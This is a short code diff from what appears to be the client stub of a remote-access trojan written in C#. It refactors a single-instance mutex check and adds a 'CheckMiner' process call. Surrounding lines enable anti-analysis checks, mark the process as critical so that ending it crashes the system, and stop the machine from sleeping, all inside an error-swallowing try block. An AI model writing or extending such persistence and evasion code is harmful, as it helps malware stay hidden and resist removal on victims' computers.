@@ -23,7 +23,7 @@ namespace Client
 
             try
             {
-                if (!Methods.CreateMutex())
+                if (!MutexControl.CreateMutex())
                     Environment.Exit(0);
 
                 if (Convert.ToBoolean(Settings.Anti))
@@ -36,6 +36,8 @@ namespace Client
                     ProcessCritical.Set();
 
                 Methods.PreventSleep();
+
+                new CheckMiner().GetProcess();
             }
             catch { }
 
